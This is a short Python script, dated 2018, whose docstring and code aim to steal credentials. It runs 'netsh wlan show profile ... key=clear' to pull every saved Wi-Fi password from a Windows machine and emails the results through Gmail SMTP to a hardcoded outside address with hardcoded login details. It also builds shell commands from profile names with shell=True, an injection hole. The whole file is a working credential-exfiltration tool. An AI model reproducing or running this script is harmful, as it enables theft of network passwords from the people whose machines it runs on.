#!/usr/bin/env python
"""
Runs netsh to expose all wifi passwords on the local machine &
    then sends results to predetermined mail host.
v1.1 Oct 2018
johnroge -> outlook.com
Last change: Create main function
"""

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def main():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

    result = ""
    for network_name in network_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result

    send_mail("myaddress@outlook.com", "abc134abc", result)


if __name__ == '__main__':
    main()
